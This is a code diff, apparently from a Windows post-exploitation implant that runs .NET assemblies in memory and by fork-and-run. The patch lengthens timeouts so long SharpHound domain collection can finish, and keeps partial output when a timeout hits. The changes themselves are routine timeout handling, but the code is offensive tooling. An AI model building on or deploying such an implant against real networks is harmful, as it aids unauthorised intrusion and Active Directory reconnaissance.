@@ -416,7 +416,9 @@ char* dotnet_exec(const uint8_t *asm_bytes, size_t asm_len, const char *args, in
     if (!child_mode) install_exit_hook();
     HANDLE ht = CreateThread(NULL, 0, invoke_thread, &work, 0, NULL);
     if (ht) {
-        WaitForSingleObject(ht, 60000);
+        /* The parent process owns the bounded timeout; allow long-running
+         * directory-wide SharpHound collection to finish. */
+        WaitForSingleObject(ht, 900000);
         CloseHandle(ht);
     } else {
         typedef HRESULT (WINAPI *pfnInv3)(void*, OleVar16*, SAFEARRAY*, OleVar16*);
@@ -491,7 +493,7 @@ static DWORD WINAPI fork_write_thread(LPVOID p) {
     return 0;
 }
 
-char* fork_run_assembly(const uint8_t *asm_bytes, size_t asm_len, const char *args) {
+char* fork_run_assembly(const uint8_t *asm_bytes, size_t asm_len, const char *args, int timeout_sec) {
     WCHAR exe[MAX_PATH+1] = {0};
     if (!GetModuleFileNameW(NULL, exe, MAX_PATH))
         return dotnet_exec(asm_bytes, asm_len, args, 0);
@@ -542,7 +544,9 @@ char* fork_run_assembly(const uint8_t *asm_bytes, size_t asm_len, const char *ar
     char  *output  = NULL;
     size_t out_len = 0, out_cap = 0;
     BYTE   buf[8192];
-    DWORD  deadline = GetTickCount() + 60000;
+    DWORD timeout_ms = (timeout_sec >= 60 && timeout_sec <= 1800)
+                     ? (DWORD)(timeout_sec * 1000) : 60000;
+    DWORD  deadline = GetTickCount() + timeout_ms;
 
     while (GetTickCount() < deadline) {
         DWORD avail = 0;
@@ -585,11 +589,20 @@ char* fork_run_assembly(const uint8_t *asm_bytes, size_t asm_len, const char *ar
     CloseHandle(out_rd);
     if (GetTickCount() >= deadline) {
         TerminateProcess(pi.hProcess, 1);
-        if (out_len == 0) {
-            free(output);
-            WaitForSingleObject(pi.hProcess, 5000);
-            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
-            return _strdup("[!] fork-and-run timeout (60s)");
+        {
+            char marker[96];
+            int marker_len = snprintf(marker, sizeof(marker),
+                                      "\n[!] fork-and-run timeout (%lus)",
+                                      (unsigned long)(timeout_ms / 1000));
+            if (marker_len > 0) {
+                char *tmp = (char*)realloc(output, out_len + (size_t)marker_len + 1);
+                if (tmp) {
+                    output = tmp;
+                    memcpy(output + out_len, marker, (size_t)marker_len);
+                    out_len += (size_t)marker_len;
+                    output[out_len] = '\0';
+                }
+            }
         }
     }
     WaitForSingleObject(pi.hProcess, 5000);
